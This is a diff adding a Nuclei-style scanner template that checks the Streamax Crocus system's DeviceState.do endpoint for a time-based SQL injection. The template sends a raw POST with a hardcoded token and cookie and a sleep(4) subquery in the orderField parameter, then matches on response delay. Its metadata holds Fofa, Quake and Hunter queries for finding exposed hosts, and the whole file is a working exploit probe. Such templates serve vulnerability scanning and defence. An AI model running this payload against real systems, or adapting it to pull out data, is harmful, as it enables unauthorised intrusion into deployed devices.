@@ -1,0 +1,35 @@
+id: Streamax_Crocus_DeviceState_SQLi
+
+info:
+  name: Streamax_Crocus_DeviceState_SQLi
+  author: HK
+  severity: high
+  description: 锐明技术Crocus系统 DeviceState.do SQL注入
+  metadata:
+    max-request: 1
+    Fofa-query: body="/ThirdResource/respond/respond.min.js"
+    Quake-query: body="/ThirdResource/respond/respond.min.js"
+    Hunter-query: body="/ThirdResource/respond/respond.min.js"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /DeviceState.do?Action=Query HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
+    Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0MjkyODg4ODIwLjUxNA==
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDI5Mjg4ODgyMC41MTQ3OSZSSUQ9MSZNPUJNYXAmSU5TPTE=
+    Connection: close
+    Content-Length: 68
+
+    PageSize=20&PageIndex=0&orderField=(select*from(select%20sleep(4))a)
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
